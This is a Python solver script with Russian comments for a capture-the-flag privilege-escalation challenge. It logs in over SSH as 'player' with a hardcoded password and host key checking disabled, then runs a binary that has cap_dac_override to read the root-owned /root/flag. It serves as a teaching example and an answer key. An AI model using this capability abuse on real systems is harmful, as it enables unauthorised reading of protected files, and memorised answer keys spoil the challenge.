#!/usr/bin/env python3
"""privesc: setcap-просмотрщик case-reader (cap_dac_override) читает /root/flag."""
# Идея решения:
#  1. Заходим по SSH под игроком player (пароль player) на порт задачи.
#  2. Флаг лежит в /root/flag (root:root, 0600) — игроку напрямую не прочитать.
#  3. У /usr/local/bin/case-reader есть file capability cap_dac_override+ep:
#     просмотровщику безразличны обычные права на чтение, а путь к отчёту
#     он принимает аргументом командной строки.
#  4. Запускаем case-reader /root/flag — capability разрешает открыть чужой
#     файл, содержимое (флаг) уходит в stdout сессии.
import subprocess
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:13424"
host, port = target.rsplit(":", 1) if ":" in target else (target, "22")

# у /usr/local/bin/case-reader есть cap_dac_override+ep — он обходит обычные
# проверки прав на чтение; путь отчёта передаётся аргументом
result = subprocess.run(
    ["sshpass", "-p", "player", "ssh",
     # host-ключ не проверяем и known_hosts не трогаем: любой интерактивный
     # вопрос ssh повесил бы неинтерактивный солвер
     "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
     "-p", port, f"player@{host}", "/usr/local/bin/case-reader /root/flag"],
    capture_output=True, text=True, check=True)
# stdout команды = содержимое «отчёта»; strip() срезает хвостовой перевод строки
print(result.stdout.strip())
